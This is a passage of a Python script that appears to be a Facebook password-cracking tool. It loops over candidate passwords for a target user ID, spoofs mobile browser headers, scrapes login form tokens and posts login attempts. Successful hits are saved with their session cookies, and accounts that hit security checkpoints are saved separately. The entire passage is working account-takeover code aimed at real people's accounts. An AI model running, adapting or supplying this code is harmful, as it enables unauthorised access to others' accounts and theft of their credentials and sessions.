	ua = random.choice(['Mozilla/5.0 (Linux; U; Android 8.1.0; DRA-LX5 Build/HUAWEIDRA-LX5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069','Mozilla/5.0 (Linux; Android 11; TECNO PR651H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Mobile Safari/537.36 OPR/70.3.3653.66287','Mozilla/5.0 (Linux; U; Android 8.1.0; ASUS_X00TD Build/OPM1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'])
	ua2 = random.choice(['Mozilla/5.0 (Linux; U; Android 8.1.0; DRA-LX5 Build/HUAWEIDRA-LX5; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069','Mozilla/5.0 (Linux; Android 11; TECNO PR651H) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/102.0.5005.134 Mobile Safari/537.36 OPR/70.3.3653.66287','Mozilla/5.0 (Linux; U; Android 8.1.0; ASUS_X00TD Build/OPM1; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/103.0.5060.129 Mobile Safari/537.36 OPR/63.0.2254.62069'])
	ses = requests.Session()
	for pw in pwv:
		try:
			ses.headers.update({"Host":'mbasic.facebook.com',"upgrade-insecure-requests":"1","user-agent":ua2,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","dnt":"1","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			p = ses.get('https://mbasic.facebook.com/login.php?skip_api_login=1&api_key=1862952583919182&kid_directed_site=0&app_id=1862952583919182&signed_next=1&next=https%3A%2F%2Fmbasic.facebook.com%2Fv2.9%2Fdialog%2Foauth%2F%3Fplatform%3Dfacebook%26client_id%3D1862952583919182%26response_type%3Dtoken%26redirect_uri%3Dhttps%253A%252F%252Fwww.tiktok.com%252Flogin%252F%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%26scope%3Dpublic_profile%26auth_type%3Dreauthenticate%26display%3Dpopup%26ret%3Dlogin%26fbapp_pres%3D0%26logger_id%3Dc5ab7d53-0810-47b0-8640-39adfbf98cfd%26tp%3Dunspecified&cancel_url=https%3A%2F%2Fwww.tiktok.com%2Flogin%2F%3Ferror%3Daccess_denied%26error_code%3D200%26error_description%3DPermissions%2Berror%26error_reason%3Duser_denied%26state%3D%257B%2522client_id%2522%253A%25221862952583919182%2522%252C%2522network%2522%253A%2522facebook%2522%252C%2522display%2522%253A%2522popup%2522%252C%2522callback%2522%253A%2522_hellojs_6e2e4pat%2522%252C%2522state%2522%253A%2522%2522%252C%2522redirect_uri%2522%253A%2522https%253A%252F%252Fwww.tiktok.com%252Flogin%252F%2522%252C%2522scope%2522%253A%2522basic%2522%257D%23_%3D_&display=touch&locale=id_ID&pl_dbl=0&refsrc=deprecated&_rdr').text
			dataa ={"lsd":re.search('name="lsd" value="(.*?)"', str(p)).group(1),"jazoest":re.search('name="jazoest" value="(.*?)"', str(p)).group(1),"uid":idf,"flow":"login_no_pin","pass":pw,"next":"https://developers.facebook.com/tools/debug/accesstoken/"}
			ses.headers.update({"Host":'mbasic.facebook.com',"cache-control":"max-age=0","upgrade-insecure-requests":"1","origin":"https://m.facebook.com","content-type":"application/x-www-form-urlencoded","user-agent":ua,"accept":"text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*[inserted by cython to avoid comment closer]/[inserted by cython to avoid comment start]*;q=0.8,application/signed-exchange;v=b3;q=0.9","x-requested-with":"mark.via.gp","sec-fetch-site":"same-origin","sec-fetch-mode":"cors","sec-fetch-user":"empty","sec-fetch-dest":"document","referer":"https://m.facebook.com/index.php?next=https%3A%2F%2Fdevelopers.facebook.com%2Ftools%2Fdebug%2Faccesstoken%2F","accept-encoding":"gzip, deflate br","accept-language":"en-GB,en-US;q=0.9,en;q=0.8"})
			po = ses.post('https://mbasic.facebook.com/login/device-based/validate-password/?shbl=0',data=dataa,allow_redirects=False)
			if "checkpoint" in po.cookies.get_dict().keys():
				print(f'\r{b}CHECKPOINT : {K}{idf}|{pw}')
				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
				open('CP/'+cpc,'a').write(idf+'|'+pw+'\n')
				#os.popen('play-audio data/cp.mp3')
				akun.append(idf+'|'+pw)
				cp+=1
				break
			elif "c_user" in ses.cookies.get_dict().keys():
				ok+=1
				coki=po.cookies.get_dict()
				kuki = (";").join([ "%s=%s" % (key, value) for key, value in ses.cookies.get_dict().items() ])
				print(f'\r{b}SUCCESFULY : {H}{idf}|{pw}')
				print(f'\r{x}*-->{x} {H}{kuki}{H}')
				print(f'\r{x}*-->{x} {M}{ua}{M}\n')
				open('OK/'+okc,'a').write(idf+'|'+pw+'|'+kuki+'\n')
				#os.popen('play-audio data/ok.mp3')
				cek_apk(session,coki)
				break
				
			else:
				continue
		except requests.exceptions.ConnectionError:
			time.sleep(31)
	loop+=1
#-----------------------[ SYSTEM-CONTROL ]--------------------#
if __name__=='__main__':
	try:os.system('git pull')
	except:pass
	try:os.mkdir('OK')
	except:pass
	try:os.mkdir('CP')
	except:pass
	try:os.system('touch .prox.txt')
	except:pass
	login()

#>>>>> THANKS TO THIS HERE <<<<<<<#
#>>>>> GITHUB.COM/ChangFB <<<<<#